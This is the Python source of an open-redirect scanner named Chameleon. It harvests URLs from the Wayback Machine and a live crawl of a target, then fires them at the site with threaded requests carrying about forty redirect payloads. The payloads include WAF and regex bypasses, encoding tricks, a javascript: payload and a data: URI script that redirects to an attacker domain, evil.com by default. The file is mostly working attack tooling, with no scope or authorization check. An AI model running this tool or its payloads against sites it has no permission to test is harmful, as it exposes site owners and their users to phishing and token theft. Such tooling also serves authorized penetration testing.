#!/usr/bin/env python3
"""
=========================================================
  CHAMELEON 🦎 - Open Redirect Vulnerability Scanner
=========================================================
A simple, fast, and effective tool to detect Open Redirect
vulnerabilities in a list of target URLs.

Author : harry_strapper
Usage  :
    python3 chameleon.py -l urls.txt -o results
    python3 chameleon.py -l urls.txt -o results -d attacker.com --threads 20

Input file (urls.txt) format - one URL per line, e.g.:
    https://example.com/login?redirect=https://example.com/home
    https://example.com/go?next=/dashboard
    https://example.com/out?url=https://example.com

If a URL has NO query parameter, Chameleon will also try
appending common open-redirect parameter names automatically.
=========================================================
"""

import argparse
import concurrent.futures
import csv
import re
import sys
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, urljoin

try:
    import requests
except ImportError:
    sys.exit("[!] 'requests' not installed. Run: pip install requests --break-system-packages")

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLOR = True
except ImportError:
    COLOR = False

    class _Dummy:
        def __getattr__(self, _):
            return ""
    Fore = Style = _Dummy()


# ---------------------------------------------------------
# Common open-redirect parameter names (used when a URL has
# no existing query string, or you want extra coverage)
# ---------------------------------------------------------
COMMON_PARAMS = [
    "redirect", "redirect_uri", "redirect_url", "url", "next", "target",
    "rurl", "dest", "destination", "continue", "return", "returnTo",
    "return_to", "checkout_url", "go", "out", "view", "to", "link",
    "u", "forward", "callback", "callback_url", "ReturnUrl", "image_url",
    "data", "path", "domain", "site", "window", "r", "nexturl", "redir",
]

# Substrings used in "smart mode" to decide if an EXISTING query
# param looks redirect-related (so we don't waste requests mutating
# every random param like ?id= or ?page= found in a huge recon dump)
REDIRECT_PARAM_KEYWORDS = [
    "redirect", "url", "uri", "next", "target", "rurl", "dest",
    "destination", "continue", "return", "checkout", "go", "out",
    "view", "to", "link", "forward", "callback", "nexturl", "redir",
    "navigate", "location", "window", "site", "domain", "path", "u",
    "ref", "image_url", "load", "file", "data", "page", "feed", "host",
]

# Payload templates - {DOMAIN} = attacker domain, {VICTIM} = original host
PAYLOAD_TEMPLATES = [
    # --- basic ---
    "https://{DOMAIN}",
    "http://{DOMAIN}",
    "//{DOMAIN}",
    "https://{DOMAIN}/",
    "{DOMAIN}",
    # --- scheme confusion ---
    "https:{DOMAIN}",
    "https:/{DOMAIN}",
    "https:///{DOMAIN}",
    "http:/{DOMAIN}",
    "/\\{DOMAIN}",
    "\\/{DOMAIN}",
    "/\\/{DOMAIN}",
    "\\\\{DOMAIN}",
    "////{DOMAIN}",
    "/////{DOMAIN}",
    # --- subdomain / userinfo confusion using victim's own host ---
    "https://{VICTIM}.{DOMAIN}",
    "https://{VICTIM}@{DOMAIN}",
    "https://{DOMAIN}#{VICTIM}",
    "https://{DOMAIN}?{VICTIM}",
    "https://{DOMAIN}\\@{VICTIM}",
    "https://{VICTIM}%2f%2f{DOMAIN}",
    "https://{VICTIM}%2e{DOMAIN}",
    # --- whitespace / control char bypass (WAF / regex bypass) ---
    "\t//{DOMAIN}",
    "%09//{DOMAIN}",
    "%00//{DOMAIN}",
    "%0d%0a//{DOMAIN}",
    " //{DOMAIN}",
    "\n//{DOMAIN}",
    # --- encoding tricks ---
    "%2f%2f{DOMAIN}",
    "%5c%5c{DOMAIN}",
    "https://{DOMAIN}%2f%2e%2e",
    "https://{DOMAIN}/%2e%2e",
    "https:%2f%2f{DOMAIN}",
    "https:\\\\{DOMAIN}",
    "https://{DOMAIN}/..;/",
    # --- dot / IP based tricks ---
    ".{DOMAIN}",
    "https://{DOMAIN}.",
    "https://0x{DOMAIN}",
    # --- JS / data URI (for client-side / DOM-based redirect sinks) ---
    "javascript:alert(document.domain)",
    "data:text/html,<script>document.location='https://{DOMAIN}'</script>",
]


def normalize_domain(domain):
    """Make sure domain has a scheme, so urlparse/requests work properly."""
    if not domain.startswith("http://") and not domain.startswith("https://"):
        domain = "https://" + domain
    return domain.rstrip("/")


def fetch_wayback_urls(domain, limit=20000, timeout=20):
    """
    Pull historical URLs for a domain from the Wayback Machine's
    public CDX API. This is the same technique tools like
    waybackurls/gau use - completely passive, no requests sent to
    the target itself.
    """
    bare_domain = urlparse(domain).netloc or domain
    print(f"[*] Querying Wayback Machine for {bare_domain} ...")
    try:
        resp = requests.get(
            "http://web.archive.org/cdx/search/cdx",
            params={
                "url": f"{bare_domain}/*",
                "output": "json",
                "collapse": "urlkey",
                "fl": "original",
                "limit": str(limit),
            },
            timeout=timeout,
        )
        data = resp.json()
        if not data or len(data) < 2:
            print("[*] Wayback Machine returned no historical URLs.")
            return []
        urls = [row[0] for row in data[1:]]
        print(f"[+] Wayback Machine returned {len(urls)} URL(s)")
        return urls
    except Exception as e:
        print(f"[!] Wayback Machine lookup failed ({e}) - continuing without it")
        return []


def crawl_site(base_url, max_pages=40, timeout=8):
    """
    Very lightweight same-domain crawler. Starts at the homepage,
    follows internal links (BFS), and collects every URL seen -
    including ones with query strings, which is what we actually
    care about for redirect testing.
    """
    print(f"[*] Crawling {base_url} (max {max_pages} pages) ...")
    visited = set()
    found_urls = set()
    queue = [base_url]
    base_host = urlparse(base_url).netloc

    while queue and len(visited) < max_pages:
        url = queue.pop(0)
        if url in visited:
            continue
        visited.add(url)
        try:
            resp = requests.get(
                url, timeout=timeout,
                headers={"User-Agent": "Mozilla/5.0 (Chameleon-Recon)"}
            )
        except requests.RequestException:
            continue

        found_urls.add(url)

        for match in re.findall(r'(?:href|src|action)=["\']([^"\'#\s]+)', resp.text, re.IGNORECASE):
            abs_url = urljoin(url, match)
            parsed = urlparse(abs_url)
            if parsed.netloc == base_host and parsed.scheme in ("http", "https"):
                found_urls.add(abs_url)
                if abs_url not in visited and len(visited) + len(queue) < max_pages * 3:
                    queue.append(abs_url)

    print(f"[+] Crawl discovered {len(found_urls)} URL(s)")
    return list(found_urls)


def auto_recon(domain, max_urls=300, crawl_pages=40):
    """
    Full auto-recon pipeline used when the user gives just a domain
    instead of a URL list: Wayback history + live crawl, merged,
    deduped, and prioritized so URLs with redirect-looking params
    come first.
    """
    domain = normalize_domain(domain)
    wayback = fetch_wayback_urls(domain)
    crawled = crawl_site(domain, max_pages=crawl_pages)

    all_urls = list(dict.fromkeys(wayback + crawled))  # dedupe, keep order

    def has_redirect_param(u):
        q = parse_qsl(urlparse(u).query)
        return any(any(kw in k.lower() for kw in REDIRECT_PARAM_KEYWORDS) for k, _ in q)

    def has_any_param(u):
        return bool(urlparse(u).query)

    priority = [u for u in all_urls if has_redirect_param(u)]
    secondary = [u for u in all_urls if has_any_param(u) and u not in priority]
    rest = [u for u in all_urls if u not in priority and u not in secondary]

    ordered = priority + secondary + rest
    final = ordered[:max_urls]

    print(f"[+] Total unique URLs after recon: {len(all_urls)}")
    print(f"[+] Using top {len(final)} URL(s) for scanning "
          f"({len(priority)} with redirect-like params, {len(secondary)} with other params, "
          f"{len(final) - len(priority) - len(secondary)} with none)\n")
    return final


def banner():
    print(Fore.CYAN + Style.BRIGHT + r"""
   _____ _                      _                     
  / ____| |                    | |                    
 | |    | |__   __ _ _ __ ___  | | ___  ___  _ __      ____
 | |    | '_ \ / _` | '_ ` _ \ | |/ _ \/ _ \| '_ \    /_   |
 | |____| | | | (_| | | | | | ||  __/ (_) | | | |     | |
  \_____|_| |_|\__,_|_| |_| |_|\___|\___/|_| |_|     |_|
""" + Style.RESET_ALL + "      Open Redirect Vulnerability Scanner 🦎\n"
          "      Made by harry_strapper\n")


def build_payload_urls(url, attacker_domain, all_params=False):
    """
    Given a URL, yield (test_url, param_name, payload) tuples.

    Smart mode (default, all_params=False):
        Only mutates EXISTING params whose name looks redirect-related
        (see REDIRECT_PARAM_KEYWORDS). Good for huge recon URL lists
        where most params (id, page, token, etc.) are irrelevant.
        If no param looks redirect-related, falls back to appending
        COMMON_PARAMS as new query params.

    Aggressive mode (all_params=True):
        Mutates every existing param, regardless of its name.
    """
    parsed = urlparse(url)
    victim_host = parsed.netloc.split(":")[0]  # host without port, used in bypass tricks
    existing_params = parse_qsl(parsed.query, keep_blank_values=True)

    payloads = [
        t.format(DOMAIN=attacker_domain, VICTIM=victim_host) for t in PAYLOAD_TEMPLATES
    ]

    if existing_params:
        if all_params:
            param_names = [p[0] for p in existing_params]
        else:
            param_names = [
                p[0] for p in existing_params
                if any(kw in p[0].lower() for kw in REDIRECT_PARAM_KEYWORDS)
            ]
        if not param_names:
            # nothing looked redirect-related -> skip mutating junk params,
            # just append common ones instead
            param_names = []
            for pname in COMMON_PARAMS:
                new_params = existing_params + [(pname, "")]
                for payload in payloads:
                    final_params = existing_params + [(pname, payload)]
                    new_query = urlencode(final_params)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    yield test_url, pname, payload
            return
    else:
        param_names = COMMON_PARAMS

    for pname in param_names:
        for payload in payloads:
            if existing_params:
                new_params = [(k, payload if k == pname else v) for k, v in existing_params]
            else:
                new_params = [(pname, payload)]
            new_query = urlencode(new_params)
            test_url = urlunparse(parsed._replace(query=new_query))
            yield test_url, pname, payload


def is_vulnerable(location_header, attacker_domain):
    if not location_header:
        return False
    loc = location_header.lower()
    domain = attacker_domain.lower()
    return domain in loc


def check_url(test_url, param, payload, attacker_domain, timeout):
    try:
        resp = requests.get(
            test_url,
            allow_redirects=False,
            timeout=timeout,
            headers={"User-Agent": "Mozilla/5.0 (Chameleon-Scanner)"}
        )
        location = resp.headers.get("Location", "")

        # Case 1: direct redirect via Location header
        if resp.status_code in (301, 302, 303, 307, 308) and is_vulnerable(location, attacker_domain):
            return {
                "url": test_url, "param": param, "payload": payload,
                "status": resp.status_code, "location": location, "vulnerable": True
            }

        # Case 2: some apps redirect via JS/meta refresh -> do a soft check
        if attacker_domain.lower() in resp.text.lower()[:2000] and resp.status_code == 200:
            return {
                "url": test_url, "param": param, "payload": payload,
                "status": resp.status_code, "location": "(found in body - possible meta/JS redirect)",
                "vulnerable": True
            }

        return {
            "url": test_url, "param": param, "payload": payload,
            "status": resp.status_code, "location": location, "vulnerable": False
        }
    except requests.RequestException as e:
        return {
            "url": test_url, "param": param, "payload": payload,
            "status": "ERROR", "location": str(e), "vulnerable": False
        }


def main():
    parser = argparse.ArgumentParser(description="Chameleon - Open Redirect Vulnerability Scanner")
    parser.add_argument("-l", "--list", help="File containing list of target URLs (one per line)")
    parser.add_argument("-u", "--target", help="Just a domain/site (e.g. example.com) - Chameleon will "
                                                "auto-recon (Wayback Machine + live crawl) and find URLs itself. "
                                                "Use this INSTEAD of -l when you don't have a URL list.")
    parser.add_argument("-o", "--output", default="chameleon_results", help="Output file name prefix (default: chameleon_results)")
    parser.add_argument("-d", "--domain", default="evil.com", help="Attacker domain to test with (default: evil.com)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=8, help="Request timeout in seconds (default: 8)")
    parser.add_argument("--all-params", action="store_true",
                         help="Mutate EVERY query param found, not just redirect-sounding ones "
                              "(slower, use for smaller/targeted lists, not huge recon dumps)")
    parser.add_argument("--max-urls", type=int, default=300,
                         help="[auto-recon mode] max URLs to keep after recon, before scanning (default: 300)")
    parser.add_argument("--crawl-pages", type=int, default=40,
                         help="[auto-recon mode] max pages to crawl live on the target (default: 40)")
    args = parser.parse_args()

    banner()

    if not args.list and not args.target:
        sys.exit("[!] Provide either -l urls.txt  OR  -u domain.com")

    if args.list:
        try:
            with open(args.list, "r") as f:
                urls = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            sys.exit(f"[!] File not found: {args.list}")
        if not urls:
            sys.exit("[!] URL list is empty.")
    else:
        urls = auto_recon(args.target, max_urls=args.max_urls, crawl_pages=args.crawl_pages)
        if not urls:
            sys.exit("[!] Auto-recon found no URLs. Try a different domain, or supply -l with a manual list.")
        # save discovered URLs for reference / reuse with other tools
        discovered_path = f"{args.output}_discovered_urls.txt"
        with open(discovered_path, "w") as f:
            f.write("\n".join(urls))
        print(f"[+] Discovered URLs saved to: {discovered_path}\n")

    print(f"[*] Loaded {len(urls)} URL(s)")
    print(f"[*] Attacker domain: {args.domain}")
    print(f"[*] Mode: {'ALL PARAMS (aggressive)' if args.all_params else 'SMART (redirect-like params only)'}")
    print(f"[*] Threads: {args.threads}\n")

    # Build all test cases
    jobs = []
    for url in urls:
        for test_url, param, payload in build_payload_urls(url, args.domain, all_params=args.all_params):
            jobs.append((test_url, param, payload))

    print(f"[*] Total test requests to send: {len(jobs)}\n")

    results = []
    vulnerable_count = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(check_url, test_url, param, payload, args.domain, args.timeout): (test_url, param)
            for test_url, param, payload in jobs
        }
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            results.append(result)
            if result["vulnerable"]:
                vulnerable_count += 1
                print(f"{Fore.RED}{Style.BRIGHT}[VULNERABLE]{Style.RESET_ALL} "
                      f"param={result['param']} -> {result['url']}\n"
                      f"            Location: {result['location']}\n")
            else:
                status = result["status"]
                print(f"{Fore.GREEN}[safe]{Style.RESET_ALL} [{status}] param={result['param']} -> {result['url'][:90]}")

    # ---------------- Save output files ----------------
    txt_path = f"{args.output}.txt"
    csv_path = f"{args.output}.csv"

    with open(txt_path, "w") as f:
        f.write("CHAMELEON - Open Redirect Scan Results\n")
        f.write(f"Attacker domain used: {args.domain}\n")
        f.write(f"Total requests: {len(results)} | Vulnerable found: {vulnerable_count}\n")
        f.write("=" * 70 + "\n\n")
        for r in results:
            if r["vulnerable"]:
                f.write(f"[VULNERABLE] param={r['param']}\n")
                f.write(f"  URL       : {r['url']}\n")
                f.write(f"  Status    : {r['status']}\n")
                f.write(f"  Location  : {r['location']}\n\n")

    with open(csv_path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["url", "param", "payload", "status", "location", "vulnerable"])
        writer.writeheader()
        writer.writerows(results)

    print("\n" + "=" * 60)
    print(f"[+] Scan complete.")
    print(f"[+] Total requests sent : {len(results)}")
    print(f"[+] Vulnerable found    : {vulnerable_count}")
    print(f"[+] Full report (txt)   : {txt_path}")
    print(f"[+] Full report (csv)   : {csv_path}")
    print("=" * 60)


if __name__ == "__main__":
    main()
